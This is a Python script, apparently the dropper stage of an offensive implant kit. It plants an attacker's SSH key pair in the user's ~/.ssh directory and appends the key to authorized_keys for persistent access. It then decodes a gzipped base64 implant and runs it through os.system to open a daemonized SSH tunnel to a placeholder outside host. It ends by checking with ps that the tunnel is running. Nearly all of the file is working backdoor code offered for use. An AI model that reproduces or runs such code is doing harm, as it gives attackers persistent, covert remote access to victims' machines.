#/usr/bin/env python

import os
import sys
import stat
import base64
import subprocess
import time
import StringIO
import gzip
from string import ascii_lowercase

PRIVKEY = "PRIVATE_KEY_PLACEHOLDER"
PUBKEY = "PUBLIC_KEY_PLACEHOLDER"
PORT = "PORT_PLACEHOLDER"
FQDN ="FQDN_PLACEHOLDER"

RW = stat.S_IRUSR | stat.S_IWUSR

def w(p, b):
    # b: content to base64 decoded
    # p: path to write to
    with open(p, "w") as f:
        f.write(base64.b64decode(b))
    os.chmod(p, stat.S_IRUSR | stat.S_IWUSR)

def templify(template, replacements):
    out = template
    for k, v in replacements.iteritems():
        out = out.replace(k, v)
    return out

def gzbase(stuff):
    out = StringIO.StringIO()
    with gzip.GzipFile(fileobj=out, mode="wb") as f:
        f.write(stuff)
    return base64.b64encode(out.getvalue())

def ungzbase(unbased):
    gzipped = StringIO.StringIO()
    gzipped.write(base64.b64decode(unbased))
    gzipped.seek(0)
    with gzip.GzipFile(fileobj=gzipped) as f:
        return f.read()

# if .ssh doesn't exist, make it
DOTSSH = os.path.expanduser("~/.ssh")
if not os.path.exists(DOTSSH):
    os.mkdir(DOTSSH)
    os.chmod(DOTSSH, stat.S_IRWXU)

# discover what our keyname is
KEYPATH_TEMPLATE = os.path.expanduser("~/.ssh/id_rsa")
keypath = None
pubkeypath = None
for c in ascii_lowercase[1:]:
    keypath = KEYPATH_TEMPLATE + c
    pubkeypath = keypath + ".pub"
    if not os.path.exists(keypath):
        break
print "[+] keypath: %s" % keypath

w(keypath, PRIVKEY)
print "[+] wrote private key:", keypath
w(pubkeypath, PUBKEY)
print "[+] wrote public key:", pubkeypath

# we can ssh to ourselves, which is done through the backflip
with open(os.path.expanduser("~/.ssh/authorized_keys"), "a") as f:
    f.write(base64.b64decode(PUBKEY))
    print "[+] wrote to ~/.ssh/authorized_keys"


# fix the KEYFILE path in implant
payload = ungzbase('IMPLANT_PLACEHOLDER')
encoded = gzbase(templify(payload, {'KEYFILE_PLACEHOLDER' : keypath}))

# FIRE THE TORPEDO!
os.system("echo %s | base64 -d | gzip -d | python " % encoded)

print "[+] started daemonized tunnel"

print "[*] waiting one minute for tunnel to come up..."
time.sleep(5)

psx = "ps x | grep ssh | grep '%s' | grep -v grep | wc -l" % FQDN
proc = subprocess.Popen(psx, shell=True, stdout=subprocess.PIPE)
(out, err) = proc.communicate()
num = int(out.strip())
if num == 2: # there sh -c and ssh itself
    print "[+] tunnel running"
else:
    print "[-] seems like %d copies running" % num
    print "[-] Something is wrong.  You should investigate/clean-up"

#
# Editor modelines  -  https://www.wireshark.org/tools/modelines.html
#
# Local variables:
# c-basic-offset: 4
# indent-tabs-mode: nil
# End:
#
# vi: set shiftwidth=4 expandtab:
# :indentSize=4:noTabs=true:
#
